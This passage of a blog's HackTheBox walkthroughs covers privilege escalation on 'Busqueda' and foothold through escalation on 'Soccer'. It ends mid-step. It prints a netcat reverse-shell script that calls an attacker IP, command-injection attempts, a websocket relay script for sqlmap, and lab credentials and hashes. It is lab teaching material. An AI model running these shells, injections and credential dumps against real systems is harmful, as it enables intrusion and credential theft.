root / jI86kGUuj87guWr3RyF gitea / yuiu1hoiu4i5ho1uh Hopefully, I can log in to the mysql database, and leak the flag using a file read from within, with something like SELECT LOAD_FILE(&quot;/root/root.txt&quot;) 🤞
😓 Bummer. Can&rsquo;t connect to mysql. I don&rsquo;t think it&rsquo;s a matter of bad credentials&hellip; I&rsquo;m not sure why.
Perhaps those credentials are just a distraction, but it&rsquo;s also possible they are re-used somewhere. First, I&rsquo;ll try SSH:
Nope&hellip; Maybe they&rsquo;re git credentials? Let&rsquo;s review the facts:
/opt/scripts had a .git directory that I couldn&rsquo;t get into. By process of elimination, we know what git user would be necessary. It&rsquo;s not cody. We already saw that they only have one repo. Therefore it must be administrator. The name of the repo is probably scripts, because the .git directory resides within /opt/scripts. To test this out, I&rsquo;ll try cloning the repo. First, I&rsquo;ll use administrator / jI86kGUuj87guWr3RyF: Nope. Next I&rsquo;ll use administrator / yuiu1hoiu4i5ho1uh: Success! The repo is cloned to a directory where I can read through it.
My knee-jerk reaction is to clone the repo, modify the python script system-checkup.py to pop a root shell, then commit and push, and finally fetch the changes down to /opt/scripts. Unfortunately, a quick check shows that this will not work:
Oh well, the next best thing is to just read through the code and look for a way to privilege escalate.
This is the source code for system-checkup.py. Since we control the --format argument, this code becomes vulnerable:
import subprocess import sys actions = [&#39;full-checkup&#39;, &#39;docker-ps&#39;,&#39;docker-inspect&#39;] def run_command(arg_list): r = subprocess.run(arg_list, capture_output=True) if r.stderr: output = r.stderr.decode() else: output = r.stdout.decode() return output def process_action(action): if action == &#39;docker-inspect&#39;: try: _format = sys.argv[2] if len(_format) == 0: print(f&#34;Format can&#39;t be empty&#34;) exit(1) container = sys.argv[3] arg_list = [&#39;docker&#39;, &#39;inspect&#39;, &#39;--format&#39;, _format, container] print(run_command(arg_list)) except IndexError: print(f&#34;Usage: {sys.argv[0]} docker-inspect &lt;format&gt; &lt;container_name&gt;&#34;) exit(1) except Exception as e: print(&#39;Something went wrong&#39;) exit(1) elif action == &#39;docker-ps&#39;: try: arg_list = [&#39;docker&#39;, &#39;ps&#39;] print(run_command(arg_list)) except: print(&#39;Something went wrong&#39;) exit(1) elif action == &#39;full-checkup&#39;: try: arg_list = [&#39;./full-checkup.sh&#39;] print(run_command(arg_list)) print(&#39;[+] Done!&#39;) except: print(&#39;Something went wrong&#39;) exit(1) if __name__ == &#39;__main__&#39;: try: action = sys.argv[1] if action in actions: process_action(action) else: raise IndexError except IndexError: print(f&#39;Usage: {sys.argv[0]} &lt;action&gt; (arg1) (arg2)&#39;) ... exit(1) One by one, let&rsquo;s take a look at the functions this script performs:
docker-ps: This code is secure. It has no opportunities for user input and doesn&rsquo;t seem like it can be abused at all.
docker-inspect: Initially, it looks like there is a vulnerability here. If it were to work, the exploit would be simple: find a way to combine multiple arguments into one. Seems easy, right? Unfortunately, I was not successful in trying this. I tried out many techniques referenced in the relevant PayloadAllTheThings page on Command Injection. Some of my attempts were the following:
docker-inspect &quot;{{.Name}} mysql_db&quot; &quot;; id&quot; docker-inspect '{{.Name}}{$IFS}mysql_db' ';{$IFS}id' docker-inspect &quot;{{.Name}}{$IFS}mysql_db&quot; &quot;;{$IFS}id&quot; docker-inspect &quot;{{{.Name}},mysql_db}&quot; &quot;;{$IFS}id&quot; &hellip; and many many variants of similar ideas. full-checkup: At face value, this function also looks secure. After all, it doesn&rsquo;t take any user input, and the arg_list is static, right? Wrong! There is definitely something we can affect about it: the relative-path call to full-checkup.sh.
💡 Relative paths like this are relative to the location from which the binary was called, not the location of the binary itself. Thats what makes using a relative path so inherently insecure: we can make it reference a script called full-checkup.sh placed in any directory, as long as it is adjacent to where we call system-checkup.py from.
Continuing to work out of /tmp, let&rsquo;s create a special version of full-checkup.sh, one that pops a reverse shell.
cd /tmp mkdir -p ./scripts/special vim ./scripts/special/full-checkup.sh chmod 755 ./scripts/special/full-checkup.sh cd scripts/special/ the contents of the special full-checkup.sh are the following:
#!/usr/bin/bash rm /tmp/f2 mkfifo /tmp/f2 cat /tmp/f2|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 1337 &gt;/tmp/f2 Next, on the attacker machine, open up the firewall and create a new netcat listener:
sudo ufw allow from $RADDR to any port 1337 proto tcp bash nc -lvnp 1337 Then, back on the target machine (via SSH), trigger the root reverse shell:
Check back at the netcat listener on the attacker box:
🎉 Hooray, a root shell!
Now just simply cat out the flag to finish the box.
LESSONS LEARNED Attacker During privilege escalation, always look for relative paths in any program that you might use for PE. It&rsquo;s such an easy PE method that it should always be the first thing you attempt.
Keep two lists on-hand at all times:
A list of discovered credentials (full credentials, or just passwords, or just usernames) A list of services you&rsquo;ve discovered on the box that require a login. SSH should almost always be at the top of this list. Whenever you add an entry to either list, go through both lists fully and check for credential re-use with any credential-service pair you haven&rsquo;t yet tried. It helps to be methodical.
If you&rsquo;re trying to perform some kind of code injection or SSTI or whatever, keep in mind there are often ways around encoding issues. Use tools like base64 or hexdump early and often. If you&rsquo;re working in Python, try urllib.parse
Defender It is not enough to filter untrusted inputs: sometimes within software, intermediate results should also be untrusted. It would have been much more difficult to find the initial RCE if the app.py had properly escaped the output of Searchor. With the rise of prompt injection, this mindset is increasingly important. Do not use relative paths in an insecure way. Security aside, it also breaks portability! In python, an easy way to securely use a relative path is by using os.path.dirname(__file__) to get the directory where the program resides and using os.path.join(base_dir, '/relative/path') to Never store passwords in plaintext. Does this even need explanation? Better yet, try externalizing the risk by using some kind of SSO service. Credential re-use will always come back to bite you. Also, never leave credentials for one user inside a file owned by another user. Please just use a password manager. Docker configs can expose sensitive information (like credentials). Any user that can run docker commands or read the docker compose file can gain access to that sensitive information. `,url:"https://4wayhandshake.github.io/walkthrough/busqueda/"},"https://4wayhandshake.github.io/walkthrough/soccer/":{title:"Soccer",tags:["Insecure Upload","Dev Environment","Websockets","SQLi (Blind)","Credential Re-use","Malicious Plugin"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable.
It&rsquo;s funny, but some of these seem like really nice templates.
The real action, as the name of the box suggests, is at the admin panel that manages the templates. It&rsquo;s a site for typical web hosting tasks like managing hosts, editing DNS, adding users, etc.
Warning: This walkthrough contains many spoilers. **No spoilers will be unexpected if you read the walkthrough sequentially.
RECON I followed my typical first steps. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with my typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR My &ldquo;init&rdquo; nmap scan: explained This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
-sV Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running. -sC Default script scan; shorthand for --script=default -O Enable OS detection. Nmap makes its best guess to fingerprint the target. -n Disable DNS resolution: we don&rsquo;t need hostnames. Speeds up the scan greatly. -Pn Skip host discovery, which is unnecessary if we&rsquo;re targeting just one host. -oA Output results in all formats, to the nmap/init-scan directory.
# Nmap 7.93 scan initiated Thu Jun 8 13:54:03 2023 as: nmap -sC -sV -v -n -Pn -oA ./Soccer/nmap/init-scan 10.10.11.194 Nmap scan report for 10.10.11.194 Host is up (0.17s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Thu, 08 Jun 2023 10:54:19 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot GET /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | HTTPOptions: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Thu, 08 Jun 2023 10:54:19 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Thu, 08 Jun 2023 10:54:20 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; |_ &lt;/html&gt; Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jun 8 13:54:34 2023 -- 1 IP address (1 host up) scanned in 31.07 seconds Nmap revealed three services:
SSH on port 22 HTTP server on port 80 Some unknown service on port 9091 Webserver Strategy Results of the strategy will be summarized at the end of the section.
Add the target to /etc/hosts.
echo &#34;10.10.11.194 soccer.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
Download the source code &amp; extract all the links.
Omitted here because it was not helpful for this box. At a high level, this is the process I usually follow:
Use wget to download a copy of the target domain Use strings to extract all strings from the source code Use regex to parse all strings. I look for text following an href attribute and anything with http or https Perform vhost enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H &#34;Host: FUZZ.soccer.htb&#34; -c -t 40 -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 Perform subdomain enumeration on the target.
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.soccer.htb -c -t 40 -timeout 4 -ic -ac Perform directory enumeration on the target domain and any domains collected in steps (3) or (4).
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://soccer.htb -A -d 1 -t 100 -T 4 --burp --smart For vhost and subdomain enumeration, ANY RESULTS may be important. For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages. Check each page for a form with a POST method, using the list of pages from directory enumeration. I use a handy tool called Selenium Oxide. Below is a snippet that shows how I do this:
exploit = ExploitBuilder(&#39;http&#39;, addr, use_proxy=args.proxy) with open(f&#39;./{dirname}/discovered_uris.txt&#39;, &#39;r&#39;) as f: for f_url in f: # Change subdomains if addr != f&#39;{baseurl(f_url)}:{port}&#39;: # then skip this result # [omitted] exploit.driver.maximize_window() exploit.get(f&#39;/{page(f_url)}&#39;) # Only examine sites that have a form that does a POST forms = exploit.driver.find_elements(By.CSS_SELECTOR, &#39;form[method=&#34;POST&#34;]&#39;) user = SeO2User() for frm in forms: print(f&#39;\\nExamining form: {frm.get_attribute(&#34;outerHTML&#34;)}\\n&#39;) inputs = frm.find_elements(By.CSS_SELECTOR, &#39;input&#39;) # [omitted] Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.
Do banner-grabbing on the target.
whatweb $RADDR &amp;&amp; curl -IL $RADDR Check Wappalyzer, a tool used for identifying the underlying technologies of a website. I use the official Wappalyzer plugin for firefox.
Notable results from enumeration of this box included the following:
No VHosts or subdomains were found. 200 GET http://soccer.htb/ground3.jpg 200 GET http://soccer.htb/ground4.jpg 200 GET http://soccer.htb/ground2.jpg 200 GET http://soccer.htb/ground1.jpg 200 GET http://soccer.htb/ 301 GET http://soccer.htb/tiny =&gt; http://soccer.htb/tiny/ 301 GET http://soccer.htb/tiny/uploads =&gt; http://soccer.htb/tiny/uploads/ nginx 1.18.0, Ubuntu, PHP Exploring the website The /tiny directory brings us to a file manager login page:
Then, by attempting a login to /tiny was redirected to here, actually the same thing:
http://soccer.htb/tiny/tinyfilemanager.php Attempting to navigate to /tiny/uploads shows a standard nginx 403 Forbidden page:
FOOTHOLD On the /tiny/tinyfilemanager.php page, there is a link at the bottom: © CCP Programmers that leads to the github page of the Tiny File manager source code. Thankfully, there is some documentation regarding installation and configuration.
In the Security and User Management section, the default credentials are shown:
admin : admin@123 user : 12345 Trying the admin credentials on /tiny/tinyfilemanager.php leads to a successful login:
Clearly, the site runs PHP, so let&rsquo;s try using php-reverse-shell.php
☝️ This reverse shell is built in to kali, found at /usr/share/webshells/php/php-reverse-shell.php. Remember to modify it for your current IP and the port of your reverse shell&rsquo;s listener.
Remember to set a new firewall rule for the reverse shell (and heck, while we&rsquo;re at it, do one for a webserver too):
sudo ufw allow from 10.10.11.194 to any port 4444 proto tcp sudo ufw allow from 10.10.11.194 to any port 8000 proto tcp Then establish the listener
bash nc -lvnp 4444 We can then attempt to upload the reverse shell using the page&rsquo;s upload widget:
But unfortunately, uploading directly to /var/www/html isnt possible because the directory is not writeable. I&rsquo;m sure that /tiny/uploads directory will work though:
🤔 Hmm&hellip; Even after &ldquo;uploading&rdquo; it, it still doesn&rsquo;t seem to be uploaded. Upload from URL doesn&rsquo;t seem to work either.
However, clicking the New Item button in the top right of the page allows you to create a new directory. It seems possible to create a new directory in /tiny/uploads, so I created /tiny/uploads/test and uploaded the same reverse shell to there:
The reverse shell can then be triggered by performing an http request to http://soccer.htb/tiny/uploads/test/php-reverse-shell.php or simply by clicking the Direct Link button (second from the right in the Actions column.)
😄 And now we have a reverse shell, as www.data!
Upgrading the Shell I originally learned this procedure from this blog post. It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.
Starting with the &ldquo;dumb&rdquo; shell, change from sh to bash:
SHELL=/bin/bash script -q /dev/null You&rsquo;ll have a better prompt now, but still no tab completion and still no ability to use things like less or vi. Let&rsquo;s fix that:
[ctrl+z] stty raw -echo fg [enter] [enter] export TERM=xterm256-color The shell will be backgrounded, then enable echo mode with stty, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
USER FLAG www-data So what can www-data do? Whenever I gain foothold on a new box, I like to take the following steps:
Linux foothold strategy Run id. Find out what groups this user is in. Locate the user within /etc/passwd if possible; see if they have a shell and/or home directory.
id &amp;&amp; cat /etc/passwd | grep $USER Check if the user can sudo
sudo -l Check locations that are writable by the user or its group
find / -user [username] 2&gt;/dev/null find / -group [groupname] 2&gt;/dev/null Does the user already have any useful tools?
which nc netcat socat python perl php Check for any active and listening sockets
netstat -tulpn | grep LISTEN ☝️ also try netstat -antp
Does the user have anything in cron?
crontab -l Does the system or root have anything in cron?
cat /etc/crontab ls -laR /etc/cron* Find any SUID or SGID executables that are accessible by the user
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Download the toolbox (not covered in-depth here).
My toolbox includes linpeas, linenum, pspy, and chisel.
Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
I&rsquo;ve prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.
Run pspy and take a look at any running processes. Since pspy is closed with ctrl+c, and your reverse shell may not be fully interactive, it is best to run this on a timeout:
timeout 5m ./pspy Run pre-scripted enumeration tools, such as LinEnum or linpeas
./LinEnum.sh ./linpeas.sh -w I only did steps (1) through (5) and saved the rest for later. Notable results from the foothold strategy included the following:
(1) revealed that there are two important users on the box: www-data and player. player has a home directory, so that&rsquo;s probably where the flag is. (3) revealed that www-data is pretty locked-down. They can only write to /var/lib/nginx/* and to the directory I just created /var/www/html/tiny/uploads/test (4) revealed that nc, netcat, perl, and php are present. (5) revealed a few unexpected things: SSH, HTTP server, and that mysterious service on 9091 are all running, we knew that already. But there is also 3306 (MySQL) and 33060 (an interface to MySQL using the &lsquo;x-protocol&rsquo;). Additionally, something listening on port 3000: often a development copy of a webserver, in my experience. (11) linpeas showed something interesting: Port 3000 As I guessed, this appears to be a webserver on port 3000. I&rsquo;m not sure if it&rsquo;s under development, but it seems very similar to the original soccer.htb website. The biggest difference is that there is more in the navbar:
curl localhost:3000 ... &lt;body&gt; &lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-dark&#34;&gt; &lt;div class=&#34;container-fluid&#34;&gt; &lt;a class=&#34;navbar-brand&#34;&gt;Soccer&lt;/a&gt; &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-bs-toggle=&#34;collapse&#34; data-bs-target=&#34;#navbarNavAltMarkup&#34; aria-controls=&#34;navbarNavAltMarkup&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt; &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarNavAltMarkup&#34;&gt; &lt;div class=&#34;navbar-nav&#34;&gt; &lt;a class=&#34;nav-link active&#34; aria-current=&#34;page&#34; href=&#34;/&#34;&gt;Home&lt;/a&gt; &lt;/div&gt; &lt;div class=&#34;navbar-nav&#34;&gt; &lt;a class=&#34;nav-link active&#34; aria-current=&#34;page&#34; href=&#34;/match&#34;&gt;Match&lt;/a&gt; &lt;/div&gt; &lt;div class=&#34;navbar-nav&#34;&gt; &lt;a class=&#34;nav-link active&#34; aria-current=&#34;page&#34; href=&#34;/login&#34;&gt;Login&lt;/a&gt; &lt;/div&gt; &lt;div class=&#34;navbar-nav&#34;&gt; &lt;a class=&#34;nav-link active&#34; aria-current=&#34;page&#34; href=&#34;/signup&#34;&gt;Signup&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;header&gt; &lt;div class=&#34;container h-100&#34;&gt; &lt;div class=&#34;d-flex h-100 text-center align-items-center&#34;&gt; &lt;div class=&#34;w-100 text-white&#34;&gt; &lt;h1 class=&#34;display-3&#34;&gt;HTB FootBall Club&lt;/h1&gt; &lt;p class=&#34;lead mb-0&#34;&gt;&#34;We Love Soccer&#34;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/style&gt; &lt;/header&gt; ... Port 9091 I was curious about what was running on port 9091, so I tried connecting to it using nc $RADDR 9091. After making a request, it was clear that it was running http.
To investigate, I&rsquo;ll searching for any of the nginx directories:
find / -name nginx* -type d 2&gt;/dev/null /usr/share/doc/nginx-common /usr/share/doc/nginx-core /usr/share/doc/nginx /usr/share/nginx /usr/lib/nginx /sys/fs/cgroup/blkio/system.slice/nginx.service /sys/fs/cgroup/pids/system.slice/nginx.service /sys/fs/cgroup/devices/system.slice/nginx.service /sys/fs/cgroup/cpu,cpuacct/system.slice/nginx.service /sys/fs/cgroup/memory/system.slice/nginx.service /sys/fs/cgroup/systemd/system.slice/nginx.service /sys/fs/cgroup/unified/system.slice/nginx.service /var/lib/nginx /var/log/nginx /etc/nginx Remembering that configuration files are usually stored in /etc, I&rsquo;ll look there first.
nginx.conf does not seem to contain anything out of the ordinary. conf.d is empty. I checked sites-enabled, which contained two files:
www-data@soccer:/etc/nginx/sites-enabled$ ls default soc-player.htb Well that&rsquo;s odd. soc-player.htb seems like it would be an alternate domain running on this box. I&rsquo;ll take a look at the configuration file:
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb server { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Well how about that&hellip; very interesting. It&rsquo;s the website running on port 3000!
Based on the server_name property, there should be a subdomain that didn&rsquo;t appear during my subdomain fuzzing: soc-player.soccer.htb. I added this new subdomain to my /etc/hosts file and tried navigating to the website:
🤔 That page looks a lot like soccer.htb did, but with some extra menu items. Having found a new subdomain, I&rsquo;ll perform directory enumeration on it:
Checking out the site a bit, many things are guiding me towards signup. I&rsquo;m signing up as donjohe@mail.mail, donjohe / password:
After signing up and logging-in to the user I just created, I&rsquo;m presented with the /check page. It has form with a single text field, so I&rsquo;ll try submitting something and catching it with Burp:
The form submission was caught in my Burp proxy:
There! That&rsquo;s what port 9091 is for!
Forwarding this request resulted in a short message from ther server: &ldquo;Ticket Doesn&rsquo;t Exist&rdquo;. This was also shown on the /check page:
Worth noting that this is not the typical x-www-form-urlencoded form that we usually see. This one uses a websocket (with port 9091). See below for the source:
var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); window.onload = function () { var btn = document.getElementById(&#39;btn&#39;); var input = document.getElementById(&#39;id&#39;); ws.onopen = function (e) { console.log(&#39;connected to the server&#39;) } input.addEventListener(&#39;keypress&#39;, (e) =&gt; { keyOne(e) }); function keyOne(e) { e.stopPropagation(); if (e.keyCode === 13) { e.preventDefault(); sendText(); } } function sendText() { var msg = input.value; if (msg.length &gt; 0) { ws.send(JSON.stringify({ &#34;id&#34;: msg })) } else append(&#34;????????&#34;) } } ws.onmessage = function (e) { append(e.data) } function append(msg) { let p = document.querySelector(&#34;p&#34;); // let randomColor = &#39;#&#39; + Math.floor(Math.random() * 16777215).toString(16); // p.style.color = randomColor; p.textContent = msg } Websocket Fun Times I haven&rsquo;t ever had to pentest a websockets-based application before, so I read up on it a bit from this Hacktricks page. To fingerprint and search for known vulnerabilities, the Hacktricks page suggests a tool called STEWS. I downloaded the tool and tool and tried it out, first with the fingerprinting module:
Ok, that might prove to be useful later. Next I&rsquo;ll try the vulnerability detection module:
Test for generic Cross-site WebSocket Hijacking (CSWSH):
The other three vulnerabilities that the tool tests for are DoS, so I&rsquo;m not interested in them for this box
└─$ python3 STEWS-vuln-detect.py -u $RADDR:9091 -n -v -1 Testing ws://10.10.11.194:9091 &gt;&gt;&gt;Note: ws://10.10.11.194:9091 allowed http or https for origin &gt;&gt;&gt;Note: ws://10.10.11.194:9091 allowed null origin &gt;&gt;&gt;Note: ws://10.10.11.194:9091 allowed unusual char (possible parse error) &gt;&gt;&gt;VANILLA CSWSH DETECTED: ws://10.10.11.194:9091 likely vulnerable to vanilla CSWSH (any origin) ====Full list of vulnerable URLs=== [&#39;ws://10.10.11.194:9091&#39;] [&#39;&gt;&gt;&gt;VANILLA CSWSH DETECTED: ws://10.10.11.194:9091 likely vulnerable to vanilla CSWSH (any origin)&#39;] Unfortunately, like other XSS-adjacent vulnerabilities, this is only useful if I&rsquo;m attempting to steal data from another user&rsquo;s interaction with the server. And as far as I know, I&rsquo;m the only user on this box right now 👀.
This got me thinking about what kind of vulnerability I really needed to find&hellip; 🤔 Clearly this ticket ID is being checked against some database (probably the MySQL database identified earlier). Really, the best thing would be an SQL injection. I did some searching on SQL Injection against websockets, and found this page talking about it in the context of CTFs.
💡 Note to self: Could I eavesdrop on the connection from 9091 to MySQL on 3306 (or 33060)? If a new connection is formed for every DB transaction, might be able to grab the connection string that way. Since it&rsquo;s local, that communication is unlikely to be encrypted. I&rsquo;ll check this out later.
I modified the code on that page to take the websocket server address (10.10.11.194:9091) and websocket request parameter (&lsquo;id&rsquo;) as arguments. In essence, this script stands up a python webserver on my attacker box, which will take in requests via http then relay them to the target&rsquo;s websocket server. My modified version of that code is shown below:
from http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection import sys def send_ws(payload, serveraddr, param_name): ws_server = f&#39;ws://{serveraddr}&#39; ws = create_connection(ws_server) # If the server returns a response on connect, use below line #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here # For our case, format the payload in JSON message = unquote(payload).replace(&#39;&#34;&#39;,&#39;\\&#39;&#39;) # replacing &#34; with &#39; to avoid breaking JSON structure data = &#39;{&#34;%s&#34;:&#34;%s&#34;}&#39; % (param_name, message) print(f&#39;Sending {data}&#39;) ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return &#39;&#39; def middleware_server(host_port, server_addr, parameter, content_type=&#34;text/plain&#34;): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -&gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split(&#39;=&#39;,1)[1] except IndexError: payload = False if payload: content = send_ws(payload, server_addr, parameter) else: content = &#39;No parameters specified!&#39; self.send_header(&#34;Content-type&#34;, content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() if (len(sys.argv) &lt; 3) : print(&#34;Usage: ./relay.py [ws host] [parameter] \\n ex. ./relay.py 127.0.0.1:9000 id&#34;) sys.exit() addr = sys.argv[1] param = sys.argv[2] print(&#34;[+] Starting MiddleWare Server&#34;) print(&#34;[+] Send payloads in http://localhost:8081/?id=*&#34;) try: middleware_server((&#39;0.0.0.0&#39;,8081), addr, param) except KeyboardInterrupt: pass On my attacker box, I ran this script. Then in a separate tab I tried making some cURL requests to this server. It worked like a charm:
SQLMap over Websocket That&rsquo;s all great, but I could do that already just using Burp. The real goal was to try running SQLmap (which works over http) on this, just like in the article where I took the original code. Let&rsquo;s see what SQLMap turns up:
available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] soccer_db [*] sys Don&rsquo;t get me wrong, I&rsquo;m glad it&rsquo;s injectable, but time-based blind injections take f&hellip;o&hellip;r&hellip;e&hellip;v&hellip;e&hellip;r&hellip;.. 💀 Thankfully, we have direct access to the database, so all we really need are some credentials. So instead of dumping the database contents, I&rsquo;ll just obtain the password hashes and get cracking.
After a few hours, finally a few hashes were recovered:
database management system users password hashes: [*] debian-sys-maint [1]: password hash: $A$005$Qj\\x1fA(\\\\0 [*] mysql.infoschema [1]: password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED [*] mysql.session [1]: password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED [*] mysql.sys [1]: password hash: $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED [*] player [1]: password hash: *9C66A903EC673FCF95D84CE93691AD526969AA3C [*] root [1]: password hash: NULL That doesn&rsquo;t really inspire confidence&hellip;
Ok, back to the original plan: use the time based blind SQL injection to see what else MySQL has for us. Of the databases discovered during the previous enumeration attempt, the database soccer_db looks most interesting. Let&rsquo;s find out what tables it contains:
sqlmap -u &#34;http://localhost:8081/?id=1&#34; -p id -D soccer_db --tables --batch This wasn&rsquo;t too bad, actually. It only took a few minutes.
Database: soccer_db [1 table] +----------+ | accounts | +----------+ Whew, thank goodness: only one table. Let&rsquo;s dump the contents:
sqlmap -u &#34;http://localhost:8081/?id=1&#34; -p id -D soccer_db -T accounts --dump-all --batch Database: soccer_db Table: accounts [1 entry] +------+-------------------+----------------------+----------+ | id | email | password | username | +------+-------------------+----------------------+----------+ | 1324 | player@player.htb | PlayerOftheMatch2022 | player | +------+-------------------+----------------------+----------+ Nice. Storing passwords in plaintext - always a smart move 😉 So we&rsquo;ve obtained a new credential: player / PlayerOftheMatch2022
Keeping credential re-use in mind, let&rsquo;s try logging into mysql locally using the above credential:
Success! Now that I&rsquo;m not waiting hours for a time based blind SQL injection, I&rsquo;ll take a look at the rest of the database.
Result: aside from soccer_db, all tables were mysql system tables. There was no information of immediate importance.
We already know that SSH is running on the box, so it makes sense to try the player credential there, too.
🎉 Awesome! That credential was successful for SSH. We&rsquo;re now logged in as player:
I&rsquo;ve already seen that the flag user.txt is in /home/player. Time to finally read it:
cat /home/player/user.txt ROOT FLAG player Having just obtained access to a new user, I&rsquo;ll go through my usual [Linux foothold strategy](#Linux foothold strategy) and enumerate the user thoroughly. These are the key results:
player cannot sudo at all. player has access to nc, netcat, perl, and php. (Found while enumerating www-data: There is a notable permission that might be useful, worth investigating I&rsquo;m not familiar with doas, so I did some research on what it is and how it works.
😍 It&rsquo;s like sudo and su rolled together. Like a privilege escalation dream come true. It looks like I can use doas as player but only with /usr/bin/dstat. I&rsquo;ve also never used dstat, but there was some useful info on GTFObins on how to make use of it.
Apparently dstat can be used for PE because it can load arbitrary python plugins. I&rsquo;ll follow the procedure on how to create a dstat &ldquo;plugin&rdquo; for privilege escalation:
